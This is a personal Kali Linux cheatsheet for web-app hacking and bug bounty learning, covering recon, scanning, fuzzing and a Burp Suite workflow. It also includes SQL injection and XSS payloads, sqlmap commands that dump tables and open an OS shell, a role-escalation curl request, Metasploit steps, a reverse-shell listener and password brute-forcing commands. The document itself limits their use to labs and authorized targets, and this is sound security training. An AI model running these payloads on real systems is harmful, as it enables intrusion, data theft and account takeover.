# Kali Web Hacking Cheatsheet (Usama)

Focus: web app hacking, recon, bug bounty. Anything on your own targets only.

## 1. Recon (passive first)

```bash
# Tech fingerprinting
whatweb http://target.com
wappalyzer            # browser ext - instant stack detection

# Subdomains
subfinder -d target.com -all
amass enum -passive -d target.com
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sort -u

# DNS basics
dnsrecon -d target.com -t std

# Search engines (manual art)
site:target.com filetype:pdf
```
No traffic hits the target for subfinder/amass/crt.sh = safe.

## 2. Active scanning

```bash
# Fast host discovery on your own network/lab
nmap -sn 192.168.1.0/24

# Port scan (common first pass)
nmap -sV -sC -p- --min-rate 1000 192.168.1.22 -oN scan.txt

# Just service versions (lighter, faster)
nmap -sV -p 80,443,8080 target.com

# Web server fingerprint (+ basic vuln checks)
nikto -h http://target.com
```

## 3. Directory / file fuzzing

```bash
# ffuf is faster than gobuster/dirb - learn it
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ -mc 200,301,302,403

# Parameter fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://target.com/page?FUZZ=test" -mc 200

# Recursive dir busting
ffuf -w <wordlist> -u http://target.com/FUZZ -recursion -recursion-depth 2
```
Wordlists: `/usr/share/wordlists/dirb/common.txt`, `dirbuster/directory-list-2.3-medium.txt`, and install SecLists (`/usr/share/seclists`).

## 4. Burp Suite (daily driver)

```
Start: burpsuite (Community is fine for learning/labs)

Proxy tab  -> set Firefox to use 127.0.0.1:8080
Scope      -> add target host so history only captures it
sitemap    -> holds everything Burp saw - your map of the app
Repeater   -> resend & modify a request manually (Ctrl+R on a request)
Intruder   -> fuzz one position (set payloads, positions marked with §)
Dashboard  -> check scan results if using scanner

Golden workflow: browse app -> inspect history -> send interesting
request to Repeater -> modify headers/params -> observe response.
```

## 5. SQL injection (against your OWN vulnerable apps first)

```bash
# Manual test values
' OR 1=1 --
admin' --
' UNION SELECT NULL,username,password FROM users--

# Automated (only on apps you own / are in scope!)
sqlmap -u "http://target.com/item?id=1" --batch --dbs
sqlmap -u "http://target.com/item?id=1" -D dbname --tables
sqlmap -u "http://target.com/item?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/item?id=1" --os-shell     # RCE via SQLi (dangerous, sandbox only)
```

## 6. XSS (client-side)

```
Locations to test: search bars, comments, url params, headers (User-Agent, Referer)
Payloads:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
javascript:alert(1)   (in href attributes)
Context matters: reflected vs stored vs DOM. PortSwigger labs teach this properly.
```

## 7. Common auth/IDOR tests

```bash
# IDOR: change id=1 to id=2 and see if you get someone else's data
# Check: cookie tampering, session fixation, role header manipulation
curl -i -X PUT http://target.com/api/user/1 -H "Content-Type: application/json" \
     -d '{"role":"admin"}' -c cookies.txt

# Check for open redirect, insecure cookies (HttpOnly/Secure flags)
# In Burp history: look at Set-Cookie headers
```

## 8. Exploitation frameworks (use to UNDERSTAND, not script-kiddie)

```bash
# Search locally for exploits
searchsploit apache 2.4

# Metasploit quick start
msfconsole
> search wordpress
> use exploit/multi/http/wp_...
> options
> set RHOSTS target.com

# Reverse shell listener (lab only)
nc -lvnp 4444
```

## 9. Quick network/other replays

```bash
# See what's on the wire
tcpdump -i wlan0 -n port 443
wireshark &                    # GUI

# Password brute (ONLY on your own services/labs)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://target
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## 10. Your house rules (non-negotiable)

```
1. Authorized scope ONLY (your VM, your apps, labs, in-scope bounties)
2. Passive recon before any active scan
3. Rate-limit scans - go slow, stay stealthy: --min-rate / -T2
4. Never exfiltrate real data. Proof-of-concept only (usually a string/filename).
5. Keep notes: what worked, screenshots, what the vuln was -> writeups later.
6. Revert anything you modified (labs); clean up reverse shells on your own boxes.
```

## Locking in the habits (first 30 days)

| Week | Goal |
|------|------|
| 1 | nmap basics + PortSwigger SQLi labs |
| 2 | ffuf + Burp scope/Repeater/Intruder flow |
| 3 | XSS labs + first OWASP Juice Shop exploit |
| 4 | sqlmap on your OWN UsaHack + write 1 writeup |